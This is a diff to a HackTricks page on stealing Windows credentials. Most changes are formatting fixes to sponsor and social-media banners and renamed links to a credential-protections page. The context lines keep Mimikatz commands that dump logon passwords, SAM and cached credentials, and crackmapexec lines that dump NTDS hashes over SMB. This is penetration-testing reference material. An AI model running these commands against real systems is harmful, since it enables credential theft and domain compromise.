@@ -1,14 +1,14 @@
-# Stealing Credentials
+# Stealing Windows Credentials
 
 <details>
 
-<summary><strong><a href="https://www.twitch.tv/hacktricks_live/schedule">🎙️ HackTricks LIVE Twitch</a> Wednesdays 5.30pm (UTC) 🎙️ - <a href="https://www.youtube.com/@hacktricks_LIVE">🎥 Youtube 🎥</a></strong></summary>
+<summary><a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ HackTricks LIVE Twitch</strong></a> <strong>Wednesdays 5.30pm (UTC) 🎙️ -</strong> <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
 * Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
 * Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
 * Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
 * **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/carlospolopm)**.**
-* **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.
+* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
 
@@ -19,7 +19,7 @@
 Did you know that crypto projects pay more bounty rewards than their web2 counterparts?\
 This [**crypto bounty alone**](https://hackenproof.com/jungle/jungle-smart-contract) is worth $1.000.000!\
 Check out the [**top-paying bounties**](https://hackenproof.com/programs) among crypto projects.\
-[**Sign up on HackenProof**](https://hackenproof.com/register?referral_code=i_E6M25i_Um9gB56o-XsIA) to get rewarded without delays and become the web3 hacker legend.
+[**Sign up on HackenProof**](https://hackenproof.com/register?referral\_code=i\_E6M25i\_Um9gB56o-XsIA) to get rewarded without delays and become the web3 hacker legend.
 
 {% embed url="https://hackenproof.com/register?referral_code=i_E6M25i_Um9gB56o-XsIA" %}
 
@@ -49,7 +49,7 @@ Invoke-Mimikatz -DumpCreds #Dump creds from memory
 Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
 ```
 
-[**Learn about some possible credentials protections here.**](credentials-protections.md) **This protections could prevent Mimikatz from extracting some credentials.**
+[**Learn about some possible credentials protections here.**](windows-credentials-protections.md) **This protections could prevent Mimikatz from extracting some credentials.**
 
 ## Credentials with Meterpreter
 
@@ -166,16 +166,12 @@ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
 #~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
 ```
 
-
-
-
-
 <figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FfinO3sjcfKcruYYBafKC%2Fimage.png?alt=media&#x26;token=7bba2ebb-a679-4357-a859-bff2d9c5136a" alt=""><figcaption></figcaption></figure>
 
 ​Did you know that crypto projects pay more bounty rewards than their web2 counterparts?\
-****This [**crypto bounty alone**](https://hackenproof.com/jungle/jungle-smart-contract) is worth $1.000.000!\
+\*\*\*\*This [**crypto bounty alone**](https://hackenproof.com/jungle/jungle-smart-contract) is worth $1.000.000!\
 Check out the [**top-paying bounties**](https://hackenproof.com/programs) among crypto projects.\
-[**Sign up on HackenProof**](https://hackenproof.com/register?referral_code=i_E6M25i_Um9gB56o-XsIA) to get rewarded without delays and become the web3 hacker legend.
+[**Sign up on HackenProof**](https://hackenproof.com/register?referral\_code=i\_E6M25i\_Um9gB56o-XsIA) to get rewarded without delays and become the web3 hacker legend.
 
 {% embed url="https://hackenproof.com/register?referral_code=i_E6M25i_Um9gB56o-XsIA" %}
 
@@ -334,27 +330,27 @@ Download it from:[ http://www.tarasco.org/security/pwdump\_7](http://www.tarasco
 
 ## Defenses
 
-[**Learn about some credentials protections here.**](credentials-protections.md)
+[**Learn about some credentials protections here.**](windows-credentials-protections.md)
 
 ​
 
 <figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FfinO3sjcfKcruYYBafKC%2Fimage.png?alt=media&#x26;token=7bba2ebb-a679-4357-a859-bff2d9c5136a" alt=""><figcaption></figcaption></figure>
 
 ​Did you know that crypto projects pay more bounty rewards than their web2 counterparts?\
-****This [**crypto bounty alone**](https://hackenproof.com/jungle/jungle-smart-contract) is worth $1.000.000!\
+\*\*\*\*This [**crypto bounty alone**](https://hackenproof.com/jungle/jungle-smart-contract) is worth $1.000.000!\
 Check out the [**top-paying bounties**](https://hackenproof.com/programs) among crypto projects.\
-[**Sign up on HackenProof**](https://hackenproof.com/register?referral_code=i_E6M25i_Um9gB56o-XsIA) to get rewarded without delays and become the web3 hacker legend.
+[**Sign up on HackenProof**](https://hackenproof.com/register?referral\_code=i\_E6M25i\_Um9gB56o-XsIA) to get rewarded without delays and become the web3 hacker legend.
 
 {% embed url="https://hackenproof.com/register?referral_code=i_E6M25i_Um9gB56o-XsIA" %}
 
 <details>
 
-<summary><strong><a href="https://www.twitch.tv/hacktricks_live/schedule">🎙️ HackTricks LIVE Twitch</a> Wednesdays 5.30pm (UTC) 🎙️ - <a href="https://www.youtube.com/@hacktricks_LIVE">🎥 Youtube 🎥</a></strong></summary>
+<summary><a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ HackTricks LIVE Twitch</strong></a> <strong>Wednesdays 5.30pm (UTC) 🎙️ -</strong> <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
 * Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
 * Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
 * Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
 * **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/carlospolopm)**.**
-* **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.
+* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
